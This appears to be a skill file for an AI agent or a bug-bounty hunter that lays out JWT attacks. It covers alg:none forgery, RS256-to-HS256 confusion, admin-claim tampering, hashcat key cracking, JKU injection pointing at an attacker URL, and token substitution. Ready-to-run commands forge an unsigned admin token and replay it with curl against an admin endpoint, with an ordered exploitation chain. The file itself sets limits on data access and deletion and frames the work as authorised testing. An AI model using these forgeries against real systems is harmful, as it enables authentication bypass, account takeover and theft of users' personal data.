---
name: hunt-jwt
description: JWT attacks — none algorithm, alg confusion, key brute, claim manipulation, JKU/JWK injection, token substitution. Chains to auth bypass and ATO.
---

# JWT ATTACKS — 3 BULLETS MAX

**Core:** JWT flaws = authentication bypass = ATO.

## DETECTION
```bash
# Decode JWT
echo "eyJhbGci...header.eyJzdWI..." | cut -d. -f2 | base64 -d 2>/dev/null
# Check alg
curl -s "https://target.com/api/data" -H "Authorization: Bearer TOKEN" | head -1
# Decode header
echo "eyJhbGci...header" | base64 -d
```

**One-call decode (preferred):**
```bash
jwt decode <TOKEN> --decode
```

---

## ATTACKS
```
None algorithm: change alg to "none", remove signature
Alg confusion: RS256→HS256, sign with public key as HMAC secret
Claim manipulation: {"sub":"admin","role":"admin","exp":9999999999}
Key brute: hashcat -m 16500 jwt.txt wordlist.txt
JKU injection: set jku to attacker's URL → server fetches attacker's key
Key confusion via JWKS: host malicious JWKS → set kid to attacker URL
Token substitution: swap tokens between accounts
Refresh token abuse: test if valid after password change/logout
```

---

## THE ALG=NONE BYPASS — ONE CALL, NO HAND-CRAFTING

This is the highest-yield JWT attack and the one most often missed
because it looks like it "should not still work". It does. Many APIs
validate the signature only when `alg` is a signing algorithm, and skip
validation entirely when `alg: "none"`.

**Forge the token with the `jwt` tool — do not hand-craft base64:**
```bash
# Forge an alg:none token with admin claims
jwt forge \
  --algorithm none \
  --payload '{"sub":"admin","role":"admin","exp":9999999999}' \
  --header '{"alg":"none","typ":"JWT"}'
```

**Test it immediately against the endpoint that rejected the original:**
```bash
FORGED=$(jwt forge --algorithm none --payload '{"sub":"admin","role":"admin"}' --header '{"alg":"none"}')
curl -s -H "Authorization: Bearer $FORGED" "https://target.com/api/admin/users" | head -5
```

**If the server accepts it → Critical.** The forged token needs no
signature, no secret, and no account. It works against any endpoint
the original token reached.

### alg:none — the real-world chain

This is not just "auth bypass". The pattern that pays out:

```
alg:none token → admin role claim accepted →
  → read all user PII (orders, addresses, saved cards)
  → write endpoints unauthenticated (create/delete products, users)
  → combined with CORS: * → full data breach from any malicious website
```

**When you get an alg:none token, test in this order (stop at first
proven boundary):**
1. Read: `GET /api/admin/users` — confirm admin access
2. Scope: how many records? One endpoint, one record to prove. Do not
   bulk-exfiltrate. See `control-verification` IMPACT BOUNDARY.
3. Write (only if explicitly asked): `POST/DELETE` on a *test* object
   you create and delete yourself. Never delete production data.
4. CORS: check `Access-Control-Allow-Origin` on the API response. If
   `*` alongside the forged token, note the compound risk — any
   website can make authenticated admin calls.

### The alg:none test is 30 seconds — always run it

Before any other JWT work, on any token-bearing endpoint, run the
forge-and-retry. It is the cheapest highest-severity test in the
arsenal and it works on a surprising fraction of targets.

---

## CHAINS
```
None algorithm → admin access → Critical
Alg confusion → forge admin token → Critical
Claim manipulation → privilege escalation → Critical
Key brute → forge any token → Critical
```
